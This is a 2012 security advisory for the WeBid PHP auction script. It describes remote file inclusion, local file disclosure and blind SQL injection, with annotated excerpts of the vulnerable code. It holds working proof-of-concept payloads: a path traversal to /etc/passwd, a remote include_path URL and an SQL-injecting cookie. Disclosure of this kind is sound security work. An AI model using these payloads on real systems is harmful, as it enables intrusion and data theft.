  ;;,   `&#039;;, ;;     ;;;`;;;;,  `;;;
  `[[     [[[[&#039;     [[[  [[[[[. &#039;[[
   $$,    $$$$      $$$  $$$ "Y$c$$
   888_,o8P&#039;88    .d888  888    Y88
   MMMMP"`   "YmmMMMM""  MMM     YM
 
  [ Discovered by dun \ posdub[at]gmail.com ]
  [ 2012-08-17                              ]
################################################
# [ WeBid <= 1.0.4 ] Multiple Vulnerabilities  #
################################################
#
# Script: "Open source php/mysql fully featured auction script"
#
# Vendor:   http://www.webidsupport.com/
# Download: http://sourceforge.net/projects/simpleauction/files/simpleauction/
#
################################################
# [RFI] ( allow_url_include = On; register_globals = On; )
# PoC: http://localhost/WeBid/loader.php?js=admin/logout.php&include_path=http://localhost/info.txt?
#
# File: ./WeBid/loader.php (lines: 15-60)
#  ..cut..
# ob_start(&#039;ob_gzhandler&#039;);
# header("Content-type: text/javascript");
# include &#039;includes/checks/files.php&#039;;               // 1 ( Definition of $file_hashs array )
# if (isset($_GET[&#039;js&#039;]))
# {
#    $js = explode(&#039;;&#039;, $_GET[&#039;js&#039;]);                // 3 js = admin/logout.php (for example)
#    foreach ($js as $val)
#    {
#       $ext = substr($val, strrpos($val, &#039;.&#039;) + 1); // 4
#       if ($ext == &#039;php&#039;)                           // 4
#       {
#          if (check_file($val))                     // 5
#          {
#             include $val;                          // 10 include admin/logout.php
#          }
#       }
#  ..cut..
#    }
# }
# ob_end_flush();
#
# function check_file($file)
# {
#    global $file_hashs;                             // 6
#    $tmp = $file_hashs;
#    $folders = explode(&#039;/&#039;, $file);                 // 7 $folders = Array([0] => admin, [1] => logout.php)
#    foreach ($folders as $val)                      // 8 This loop checks if parts of $folders are in $file_hashs
#    {
#       if (isset($tmp[$val]))
#       {
#          $tmp = $tmp[$val];
#       }
#       else
#       {
#          return false;
#       }
#    }
#    return true;                                    // 9 admin/logout.php passed
# }
#  ..cut..
#
# File: ./WeBid/includes/checks/files.php (lines: 2-19)
#  ..cut..
# $file_hashs = array(                                      // 2 List of files that can be included.
#  ..cut..
#    &#039;admin&#039; => array(                                      // 2
#       &#039;logout.php&#039; => &#039;a0db39b73dcfd29feb1466002c4f59a4&#039;, // 2
#        ..cut..
#    ),
#  ..cut..
# );
#
# File: ./WeBid/admin/logout.php (lines: 16-17)
#  ..cut..                                           // 11 common.inc.php file contains a definition of $include_path
# include &#039;../includes/common.inc.php&#039;;              // 11 Failed, because loader.php is in root path
# include $include_path . &#039;functions_admin.php&#039;;     // 12 *[RFI] $include_path is not set by script
#  ..cut..                                           // 12 If register_globals is On, we can set $include_path
#
################################################
# [Local File Disclosure] ( magic_quotes_gpc = Off; php version < 5.3.4 )
# PoC: http://localhost/WeBid/getthumb.php?fromfile=getthumb.php&w=../../../../../etc/passwd%00
#
# File: ./WeBid/getthumb.php (lines: 17-52)
#  ..cut..
# $w = (isset($_GET[&#039;w&#039;])) ? $_GET[&#039;w&#039;] : &#039;&#039;;                                      // 1
# $fromfile = (isset($_GET[&#039;fromfile&#039;])) ? $_GET[&#039;fromfile&#039;] : &#039;&#039;;                 // 2
# $nomanage = false;
#  ..cut..
# if (!isset($_GET[&#039;fromfile&#039;]))                                                   // 3
# {
#    ErrorPNG(&#039;params empty&#039;);
#    exit;
# }
# elseif (!file_exists($_GET[&#039;fromfile&#039;]) && !fopen($_GET[&#039;fromfile&#039;], &#039;r&#039;))       // 4
# {
#    ErrorPNG(&#039;img does not exist&#039;);
#    exit;
# }
#
# if (file_exists($upload_path . &#039;cache/&#039; . $_GET[&#039;w&#039;] . &#039;-&#039; . md5($fromfile)))    // 5
# {
#    $img = getimagesize($fromfile);
#    if ($img[2] == 1)
#    {
#       $img[&#039;mime&#039;] = &#039;image/png&#039;;
#    }
#    header(&#039;Content-type: &#039; . $img[&#039;mime&#039;]);
#    echo file_get_contents($upload_path . &#039;cache/&#039; . $_GET[&#039;w&#039;] . &#039;-&#039; . md5($fromfile)); // 6 *[LFD]
#    }
# }
#  ..cut..
#
################################################
# [Blind SQL Injection] ( magic_quotes_gpc = Off; )
# PoC:
# http://localhost/WeBid/contents.php
# GET /WeBid/contents.php HTTP/1.1
# Host: localhost
# User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Accept-Language: pl,en-us;q=0.7,en;q=0.3
# Accept-Encoding: gzip, deflate
# Connection: keep-alive
# Cookie: WEBID_ONLINE=-1&#039; OR 1=1--
#
# File: ./WeBid/contents.php (lines: 15, 38)
#  ..cut..
# include &#039;includes/common.inc.php&#039;;
#  ..cut..
# include &#039;header.php&#039;;                                        // 1
#  ..cut..
#
# File: ./WeBid/header.php (line: 26)
#  ..cut..
# $counters = load_counters();                                 // 2
#  ..cut..
#
# File: ./WeBid/includes/functions_global.php (line: 287-320)
#  ..cut..
# function load_counters()                                     // 3
# {
#  ..cut..
#      if (!$user->logged_in)
#      {
#         if (!isset($_COOKIE[&#039;WEBID_ONLINE&#039;]))
#         {
#            $s = md5(rand(0, 99) . session_id());
#            setcookie(&#039;WEBID_ONLINE&#039;, $s, time() + 900);
#         }
#         else
#         {
#            $s = $_COOKIE[&#039;WEBID_ONLINE&#039;];                    // 4
#            setcookie(&#039;WEBID_ONLINE&#039;, $s, time() + 900);
#         }
#      }
#  ..cut..
#      $query = "SELECT id FROM " . $DBPrefix . "online WHERE SESSION = &#039;$s&#039;"; // 5 *[SQL]
#      $res = mysql_query($query);
#      $system->check_mysql($res, $query, __LINE__, __FILE__);
#  ..cut..
#
### [ dun / 2012 ] #############################



